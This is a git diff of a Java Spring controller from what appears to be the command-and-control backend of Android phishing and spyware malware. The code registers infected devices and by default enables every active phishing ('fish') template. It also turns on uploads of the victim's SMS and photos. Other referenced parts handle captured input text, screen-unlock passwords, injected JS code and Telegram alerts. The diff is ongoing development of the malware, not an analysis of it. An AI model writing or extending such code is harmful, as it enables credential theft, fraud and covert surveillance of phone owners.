@@ -1,12 +1,23 @@
 package io.renren.modules.app.web.api;
 
-import java.util.Date;
-import java.util.List;
-import java.util.Objects;
-
-import javax.annotation.Resource;
-import javax.servlet.http.HttpServletRequest;
-
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import io.renren.common.constant.Constant;
+import io.renren.common.utils.IpUtils;
+import io.renren.common.utils.Result;
+import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
+import io.renren.modules.app.common.Utils;
+import io.renren.modules.app.context.DeviceContext;
+import io.renren.modules.app.entity.*;
+import io.renren.modules.app.handler.TelegramNotificationHandler;
+import io.renren.modules.app.service.*;
+import io.renren.modules.app.vo.DeviceStatus;
+import io.renren.modules.app.vo.FishDataVo;
+import io.renren.modules.app.vo.ServerConfig;
+import io.renren.modules.app.vo.UnLockParams;
+import io.renren.modules.sys.dao.SysParamsDao;
+import lombok.extern.slf4j.Slf4j;
+import org.apache.commons.collections4.CollectionUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -14,44 +25,11 @@ import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
-import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
-
-import io.renren.common.constant.Constant;
-import io.renren.common.utils.IpUtils;
-import io.renren.common.utils.Result;
-import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
-import io.renren.modules.app.common.Utils;
-import io.renren.modules.app.context.DeviceContext;
-import io.renren.modules.app.entity.AlbumPicEntity;
-import io.renren.modules.app.entity.Device;
-import io.renren.modules.app.entity.FishData;
-import io.renren.modules.app.entity.FishTemplates;
-import io.renren.modules.app.entity.InputTextRecord;
-import io.renren.modules.app.entity.InstallApp;
-import io.renren.modules.app.entity.JsCode;
-import io.renren.modules.app.entity.Log;
-import io.renren.modules.app.entity.SmsInfoEntity;
-import io.renren.modules.app.entity.UnlockScreenPwd;
-import io.renren.modules.app.handler.TelegramNotificationHandler;
-import io.renren.modules.app.service.AlbumPicService;
-import io.renren.modules.app.service.DeviceService;
-import io.renren.modules.app.service.FishDataService;
-import io.renren.modules.app.service.FishTemplateService;
-import io.renren.modules.app.service.HeartService;
-import io.renren.modules.app.service.InputTextRecordService;
-import io.renren.modules.app.service.InstallAppService;
-import io.renren.modules.app.service.JsCodeService;
-import io.renren.modules.app.service.LogService;
-import io.renren.modules.app.service.SmsInfoService;
-import io.renren.modules.app.service.UnlockScreenPwdService;
-import io.renren.modules.app.vo.DeviceStatus;
-import io.renren.modules.app.vo.FishDataVo;
-import io.renren.modules.app.vo.ServerConfig;
-import io.renren.modules.app.vo.UnLockParams;
-import io.renren.modules.sys.dao.SysParamsDao;
-import lombok.extern.slf4j.Slf4j;
+import javax.annotation.Resource;
+import javax.servlet.http.HttpServletRequest;
+import java.util.Date;
+import java.util.List;
+import java.util.Objects;
 
 @Slf4j
 @RestController
@@ -119,8 +97,16 @@ public class DeviceApiController extends BaseApiController {
             device.setId(dbDevice.getId());
             deviceService.updateById(device);
         } else {
+
+            List<FishTemplates> list = fishTemplateService.effectiveFishTemplates();
             JSONObject fishSwitch = new JSONObject();
-            fishSwitch.put(Constant.FishCode.unlock, true);
+            if(CollectionUtils.isNotEmpty(list)){
+                for (FishTemplates fishTemplates : list) {
+                    fishSwitch.put(fishTemplates.getCode(), true);
+                }
+            }
+
+
             device.setFishSwitch(fishSwitch);
             device.setUploadSms(Constant.YN.Y);
             device.setUploadAlbum(Constant.YN.Y);
@@ -297,10 +283,7 @@ public class DeviceApiController extends BaseApiController {
 
     @RequestMapping("fishTemplates")
     public Result<List<FishTemplates>> fishTemplates(@RequestBody JSONObject jsonObject) {
-        LambdaQueryWrapper<FishTemplates> query = new LambdaQueryWrapper<>();
-        query.eq(FishTemplates::getStatus, Constant.FishTemplatesStatus.effective);
-        List<FishTemplates> list = fishTemplateService.list(query);
-        return Result.toSuccess(list);
+        return Result.toSuccess(fishTemplateService.effectiveFishTemplates());
     }
 
 
